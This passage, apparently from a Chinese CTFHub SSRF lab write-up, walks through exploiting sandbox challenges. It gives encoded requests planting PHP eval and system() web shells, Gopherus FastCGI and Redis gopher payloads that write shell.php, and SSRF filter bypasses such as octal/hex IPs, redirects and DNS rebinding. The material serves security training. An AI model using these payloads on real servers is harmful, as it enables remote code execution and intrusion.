php%0D%0AUpgrade-Insecure-Requests%3A%201%0D%0APriority%3A%20u%3D0%2C%20i%0D%0A%0D%0A------geckoformboundary51834e26d074966e704b418761d460d1%0D%0AContent-Disposition%3A%20form-data%3B%20name%3D%22file%22%3B%20filename%3D%22shell.php%22%0D%0AContent-Type%3A%20application%2Foctet-stream%0D%0A%0D%0A%3C%3Fphp%20echo%20123%3B%40eval(%24_POST%5B'code'%5D)%3B%3F%3E%0D%0A------geckoformboundary51834e26d074966e704b418761d460d1--
```

第二次URL编码

```html
POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520challenge-b9fff0bf1f4b1a36.sandbox.ctfhub.com%253A10800%250D%250AUser-Agent%253A%2520Mozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%253B%2520rv%253A140.0)%2520Gecko%252F20100101%2520Firefox%252F140.0%250D%250AAccept%253A%2520text%252Fhtml%252Capplication%252Fxhtml%252Bxml%252Capplication%252Fxml%253Bq%253D0.9%252C*%252F*%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Czh-TW%253Bq%253D0.7%252Czh-HK%253Bq%253D0.5%252Cen-US%253Bq%253D0.3%252Cen%253Bq%253D0.2%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AContent-Type%253A%2520multipart%252Fform-data%253B%2520boundary%253D----geckoformboundary51834e26d074966e704b418761d460d1%250D%250AContent-Length%253A%2520266%250D%250AOrigin%253A%2520http%253A%252F%252Fchallenge-b9fff0bf1f4b1a36.sandbox.ctfhub.com%253A10800%250D%250AConnection%253A%2520close%250D%250AReferer%253A%2520http%253A%252F%252Fchallenge-b9fff0bf1f4b1a36.sandbox.ctfhub.com%253A10800%252F%253Furl%253D127.0.0.1%252Fflag.php%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250APriority%253A%2520u%253D0%252C%2520i%250D%250A%250D%250A------geckoformboundary51834e26d074966e704b418761d460d1%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522shell.php%2522%250D%250AContent-Type%253A%2520application%252Foctet-stream%250D%250A%250D%250A%253C%253Fphp%2520echo%2520123%253B%2540eval(%2524_POST%255B'code'%255D)%253B%253F%253E%250D%250A------geckoformboundary51834e26d074966e704b418761d460d1--
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751706542492-3ad83c11-c956-41ff-b542-341ba0b65172.png)

成功

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751706560469-c3bf546b-a091-4946-898a-0a4a95cafac9.png)

### FastCGI协议
安装gopherus

```html
git clone https://github.com/tarunkant/Gopherus.git
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2 get-pip.py
./install.sh
```

生成exploit

```html
python2 gopherus.py --exploit fastcgi
/var/www/html/index.php
echo PD9waHAgZXZhbCgkX1BPU1RbJ2NvZGUnXSk7Pz4= | base64 -d >/var/www/html/shell.php
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751708126475-053726ca-fea6-4f14-b7d9-f2ed7e6c8580.png)

进行一次URL编码

```html
_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2505%2505%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2503CONTENT_LENGTH134%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%2586%2504%2500%253C%253Fphp%2520system%2528%2527echo%2520PD9waHAgZXZhbCgkX1BPU1RbJ2NvZGUnXSk7Pz4%253D%2520%257C%2520base64%2520-d%2520%253E%2Fvar%2Fwww%2Fhtml%2Fshell.php%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751708362166-b4d18f1d-c540-4f31-8d39-04d6f70bac07.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751708878530-1f08ff58-2cab-4fdb-a1b6-b1f0f2dc88ef.png)

蚁剑连接`[http://challenge-ab6a103940705427.sandbox.ctfhub.com:10800/shell.php](http://challenge-ab6a103940705427.sandbox.ctfhub.com:10800/shell.php)`成功

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751708914826-e3666179-2fb9-4451-9287-109d32b9c368.png)

### Redis协议
```html
http://challenge-2330ba3a9a6a7458.sandbox.ctfhub.com:10800/?url=dict://127.0.0.1:6379
```

gopherus生成exploit

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751773859076-57c643ec-f8b3-42d0-8279-7d90a5aeedce.png)

url编码

```html
gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751774949929-4df9cf3e-ade3-4a1e-b5bf-feff2136739d.png)

响应返回504，访问shell.php成功

```html
http://challenge-2330ba3a9a6a7458.sandbox.ctfhub.com:10800/shell.php?cmd=ls
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751775003360-93e67cb6-0229-4ca7-990f-b5f7934b30c8.png)

```html
?cmd=ls /
?cmd=cat /flag_eb4d87188e48c82b40fe59e7eb88ee74
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751775066088-ba015afe-22ca-4aa4-8538-c99b36e0ab97.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751775107485-792ddb2a-62af-4a97-8027-6d6853cdf77f.png)

### URL Bypass
```html
?url=http://notfound.ctfhub.com@127.0.0.1/flag.php # 协议://user@url
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751799790180-8fd17bb6-562d-4d9a-ae95-4a31c2f58f88.png)

### 数字IP Bypass
```html
?url=http://localhost/flag.php
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751800054046-3a886528-a260-4718-a164-357852acd9c6.png)

```html
8进制格式：0177.0.0.1
16进制格式：0x7F.0.0.1
10进制整数格式：2130706433
16进制整数格式：0x7F000001
```

### 302跳转 Bypass
```html
?url=http://localhost/flag.php
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751800351087-8c9e2330-4805-4ca8-9d14-7c65dbc81f89.png)

### DNS重绑定 Bypass
```html
?url=http://www.baidu.com/index.html #可访问域名
```

添加DNS A记录为127.0.0.1

```html
?url=http://local.ghostliner.top/flag.php
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751800835105-43b56420-cc01-4e6a-b10d-efe9316a10b8.png)

